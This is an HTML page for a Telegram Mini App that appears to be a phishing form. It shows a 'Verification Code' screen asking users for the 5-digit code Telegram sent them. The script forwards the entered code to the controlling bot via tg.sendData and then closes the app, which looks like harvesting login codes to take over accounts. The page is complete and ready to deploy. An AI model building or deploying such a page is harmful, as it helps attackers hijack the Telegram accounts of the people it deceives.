<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Enter Code</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            background-image: url('https://images.unsplash.com/photo-1557682250-33bd709cbe85?w=800');
            background-size: cover;
            background-position: center;
            position: relative;
        }
        body::before {
            content: '';
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0, 0, 0, 0.6);
            z-index: 0;
        }
        .container {
            position: relative;
            z-index: 1;
            width: 100%;
            max-width: 400px;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(15px);
            border-radius: 20px;
            padding: 30px 25px;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        .header { text-align: center; margin-bottom: 25px; color: #fff; }
        .icon { font-size: 60px; margin-bottom: 10px; display: block; }
        h1 { font-size: 24px; margin-bottom: 8px; }
        .subtitle { font-size: 14px; opacity: 0.85; }
        label { display: block; font-size: 14px; margin-bottom: 8px; color: #fff; }
        input {
            width: 100%;
            padding: 16px;
            font-size: 18px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            background: rgba(255, 255, 255, 0.15);
            color: #fff;
            border-radius: 12px;
            text-align: center;
            outline: none;
        }
        input::placeholder { color: rgba(255, 255, 255, 0.5); }
        input:focus { border-color: #2481cc; }
        button {
            width: 100%;
            padding: 16px;
            background: #2481cc;
            color: #fff;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            margin-top: 15px;
            cursor: pointer;
        }
        button:disabled { opacity: 0.5; }
        .status { text-align: center; margin-top: 15px; font-size: 13px; color: #fff; }
        .loading {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            vertical-align: middle;
            margin-left: 8px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <span class="icon">🔐</span>
            <h1>Verification Code</h1>
            <p class="subtitle">Enter the 5-digit code sent to your Telegram app</p>
        </div>
        <label>Code:</label>
        <input type="tel" id="code" placeholder="12345" maxlength="6" inputmode="numeric" dir="ltr">
        <button onclick="sendCode()" id="btnCode">Verify Code</button>
        <p class="status" id="status"></p>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        tg.ready();

        function sendCode() {
            const code = document.getElementById('code').value.replace(/\D/g, '');
            const status = document.getElementById('status');
            const btn = document.getElementById('btnCode');

            if (!code || code.length < 4) {
                tg.showAlert('Enter code');
                return;
            }

            btn.disabled = true;
            status.innerHTML = '<span class="loading"></span> Verifying...';

            try {
                tg.sendData(JSON.stringify({ action: 'send_code', code: code }));
                status.innerHTML = '✅ Checking... (If wrong, you will get an error in chat)';
                status.style.color = '#4ade80';
                
                // بستن وب‌اپ بعد از 2 ثانیه
                setTimeout(() => {
                    tg.close();
                }, 2000);
            } catch(e) {
                status.innerHTML = '❌ ' + e.message;
                btn.disabled = false;
            }
        }
    </script>
</body>
</html>
